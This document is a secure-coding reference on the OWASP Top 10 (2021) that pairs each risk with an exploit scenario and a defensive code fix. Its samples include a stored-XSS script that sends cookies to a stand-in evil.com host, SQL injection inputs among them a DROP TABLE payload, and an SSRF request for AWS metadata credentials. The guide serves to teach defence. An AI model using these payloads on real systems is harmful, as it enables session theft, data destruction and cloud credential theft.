# OWASP Top 10 (2021) — Practical Security Reference

The OWASP Top 10 is the canonical list of critical web application security risks, updated every 3–4 years. This article gives each vulnerability a concrete exploit scenario and actionable fix.

## Quick Reference Table

| # | Vulnerability | Root Cause | Severity |
|---|---|---|---|
| A01 | Broken Access Control | Missing server-side authorization checks | Critical |
| A02 | Cryptographic Failures | Weak/missing encryption, exposed sensitive data | Critical |
| A03 | Injection | Untrusted data interpreted as commands | Critical |
| A04 | Insecure Design | Missing threat modeling, insecure architecture | High |
| A05 | Security Misconfiguration | Insecure defaults, unnecessary features enabled | High |
| A06 | Vulnerable Components | Unpatched dependencies with known CVEs | High |
| A07 | Authentication Failures | Weak auth, no brute-force protection | High |
| A08 | Software Integrity Failures | No signature verification, supply chain attacks | High |
| A09 | Logging and Monitoring Failures | No audit trail, undetected breaches | Medium |
| A10 | Server-Side Request Forgery | Server fetches attacker-controlled URLs | High |

---

## A01 — Broken Access Control

**Exploit scenario — IDOR (Insecure Direct Object Reference):**
```
GET /api/documents/1042          → returns your document
GET /api/documents/1043          → returns someone else's document (no ownership check!)

DELETE /api/admin/users/99       → attacker deletes any user (missing role check)
```

**Why it happens**: Authorization logic lives in the frontend ("hide the button"), not the backend.

**Fix**: Enforce at every API endpoint — check identity AND ownership:
```typescript
// Vulnerable
app.get("/api/documents/:id", async (req, res) => {
  const doc = await db.documents.findById(req.params.id);
  res.json(doc);
});

// Fixed
app.get("/api/documents/:id", requireAuth, async (req, res) => {
  const doc = await db.documents.findById(req.params.id);
  if (!doc || doc.ownerId !== req.user.sub) {
    return res.status(403).json({ error: "Forbidden" });
  }
  res.json(doc);
});
```

**Checklist**: Deny by default. Use UUIDs instead of sequential IDs. Validate roles server-side. Log every 403.

---

## A02 — Cryptographic Failures

**Exploit scenario:** Database breach reveals passwords stored as MD5 hashes. Attacker runs rainbow table — cracks 80% of passwords in minutes. MD5 is non-salted, fast, and pre-computed tables exist for billions of common passwords.

**Fix — use adaptive hashing for passwords:**
```typescript
import bcrypt from "bcrypt";
import argon2 from "argon2";

// bcrypt: cost factor scales with hardware
const hash = await bcrypt.hash(password, 12);  // ~250ms on modern CPU
const valid = await bcrypt.compare(attempt, hash);

// argon2id (preferred — winner of Password Hashing Competition 2015)
const hash = await argon2.hash(password, {
  type:        argon2.argon2id,
  memoryCost:  65536,   // 64 MB RAM — makes GPU cracking expensive
  timeCost:    3,
  parallelism: 4,
});
```

**Other failures**:
- HTTP in production (no encryption in transit)
- TLS 1.0/1.1 still enabled (cipher suites with known weaknesses)
- Storing credit card numbers you don't need
- Weak random number generation for secrets (`Math.random()` is not cryptographic)

```typescript
// Wrong: Math.random() is deterministic, not cryptographically secure
const token = Math.random().toString(36);

// Correct: use crypto module
import crypto from "crypto";
const token = crypto.randomBytes(32).toString("hex");  // 256-bit entropy
```

---

## A03 — Injection

Injection occurs when untrusted input is concatenated into a query, command, or template and interpreted by the underlying engine.

### SQL Injection

```sql
-- Vulnerable: string concatenation
SELECT * FROM users WHERE username = '" + req.body.username + "'

-- Attacker input: ' OR '1'='1' --
-- Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1' --'
-- Returns ALL users, bypasses authentication
```

```sql
-- More destructive input: '; DROP TABLE users; --
-- Results in data destruction
```

**Fix — parameterized queries (every ORM and driver supports this):**
```typescript
// Raw SQL with parameters
const user = await db.query(
  "SELECT * FROM users WHERE username = $1 AND active = $2",
  [req.body.username, true]
);

// ORM (Prisma, TypeORM) — parameterized by default
const user = await prisma.user.findFirst({
  where: { username: req.body.username }
});
```

### Cross-Site Scripting (XSS)

XSS injects scripts into pages viewed by other users. Stored XSS is the most dangerous — the payload persists in the database.

```html
<!-- Stored XSS: attacker submits this as a comment -->
<script>
  fetch("https://evil.com/steal?c=" + document.cookie);
</script>

<!-- Victim loads the page → their cookies/tokens sent to attacker -->
```

```typescript
// Vulnerable: raw HTML insertion
element.innerHTML = userContent;

// Fixed: escape or use safe APIs
element.textContent = userContent;               // always safe
element.innerHTML   = DOMPurify.sanitize(userContent);  // if HTML is needed
```

**Server-side**: set Content-Security-Policy header to block inline scripts:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

---

## A04 — Insecure Design

Design-level flaws that no amount of correct implementation can fix. Examples:
- Password reset via security questions (guessable, findable on social media)
- "Recovery code" emailed in plaintext and stored in email forever
- No rate limiting designed into the architecture — added as afterthought, inconsistently

**Fix**: Threat model during design (not after). For each feature ask: "What's the worst thing an attacker could do with this?" Use STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege).

---

## A05 — Security Misconfiguration

**Common instances**:
```
- Default admin/admin credentials on database or admin panel
- Directory listing enabled: GET /uploads/ → lists all uploaded files
- Stack traces returned in production API errors
- DEBUG=true in production Django/Flask → interactive debugger exposed
- Overly permissive CORS: Access-Control-Allow-Origin: *
- Open S3 bucket: s3://company-backups publicly readable
- Unused features enabled: SOAP endpoints, old API versions, sample apps
```

**Fix — explicit hardening checklist per environment**:
```nginx
# nginx: disable server version leakage
server_tokens off;

# Remove default index pages
# No autoindex directive
# Restrict methods
limit_except GET POST { deny all; }
```

```typescript
// Never leak internal errors to clients
app.use((err: Error, req: Request, res: Response, _next: NextFunction) => {
  logger.error({ err, path: req.path });  // log full error internally
  res.status(500).json({ error: "Internal server error" });  // generic to client
});
```

---

## A06 — Vulnerable and Outdated Components

Supply chain attacks increased 742% between 2019 and 2022. A dependency you trust today may have a critical CVE tomorrow — or may have been backdoored.

**Fix**:
```bash
# Audit regularly
npm audit
npm audit fix

# Use lock files and verify integrity
npm ci  # installs from package-lock.json exactly

# Automated scanning in CI
npx audit-ci --critical  # fail build on critical CVEs

# Pin major versions, review changelogs before upgrading
```

Notable real incidents: `event-stream` npm package (backdoored to steal bitcoin wallets), `log4shell` (CVSS 10.0 RCE in log4j), `left-pad` deletion (broke builds globally).

---

## A07 — Identification and Authentication Failures

**Exploit**: Credential stuffing — attacker purchases a leaked credential database (8 billion entries exist publicly) and tries every pair against your login endpoint. No rate limiting = thousands of accounts compromised.

**Fix layered defenses**:
```typescript
// 1. Rate limiting per IP and per username
const loginLimiter = rateLimit({
  windowMs:  15 * 60 * 1000,  // 15 minutes
  max:        10,               // 10 attempts per window
  keyGenerator: (req) => req.body.username + req.ip,
});

// 2. Progressive delays after failures (exponential backoff)
// 3. CAPTCHA after N failures
// 4. Account lockout notification email
// 5. Enforce password complexity + breach detection (Have I Been Pwned API)
// 6. Require MFA for sensitive operations
```

---

## A08 — Software and Data Integrity Failures

**Exploit — malicious CI/CD pipeline**: Attacker compromises a dependency's GitHub account, pushes malicious code, tags a new release. Your automated dependency update merges it. Next deployment ships malware.

**Fix**:
```json
// package.json: pin exact versions for critical dependencies
"dependencies": {
  "jsonwebtoken": "9.0.2",     // not "^9.0.2"
}
```

```bash
# Verify checksums in CI
sha256sum -c checksums.txt

# Use Subresource Integrity for CDN scripts
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-<hash>"
        crossorigin="anonymous"></script>
```

---

## A09 — Security Logging and Monitoring Failures

The average breach goes undetected for **207 days** (IBM Cost of a Data Breach 2023). Insufficient logging is why.

**What to log** (without logging sensitive data):
```typescript
// Log security-relevant events
logger.info({
  event:   "auth.login_success",
  userId:  user.id,
  ip:      req.ip,
  userAgent: req.headers["user-agent"],
  timestamp: new Date().toISOString(),
});

logger.warn({
  event:   "auth.login_failure",
  username: req.body.username,   // log attempted username (not password)
  ip:      req.ip,
  reason:  "invalid_password",
});

logger.warn({
  event: "access_control.denied",
  userId: req.user?.sub,
  path:  req.path,
  method: req.method,
});
```

**What not to log**: passwords, full credit card numbers, session tokens, PII (GDPR/HIPAA implications), JWT payloads.

---

## A10 — Server-Side Request Forgery (SSRF)

**Exploit scenario**:
```
POST /api/fetch-metadata
{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role" }

Server fetches the AWS instance metadata endpoint.
Response includes temporary AWS credentials.
Attacker now has access to S3, RDS, Lambda, etc.
```

**Fix — allowlist, not blocklist**:
```typescript
import { URL } from "url";
import dns from "dns/promises";

async function safeFetch(rawUrl: string): Promise<Response> {
  const url = new URL(rawUrl);  // throws on invalid URLs

  // Allowlist scheme and host
  if (!["https:"].includes(url.protocol)) {
    throw new Error("Only HTTPS allowed");
  }
  if (!ALLOWED_DOMAINS.has(url.hostname)) {
    throw new Error("Domain not allowed");
  }

  // Resolve and check for private IP ranges
  const addresses = await dns.lookup(url.hostname, { all: true });
  for (const { address } of addresses) {
    if (isPrivateIP(address)) {
      throw new Error("Private IP blocked");
    }
  }

  return fetch(url.toString(), { redirect: "error" });  // don't follow redirects
}
```

Private ranges to block: `10.x.x.x`, `172.16–31.x.x`, `192.168.x.x`, `169.254.x.x` (link-local/metadata), `127.x.x.x`, `::1`, `fd00::/8`.
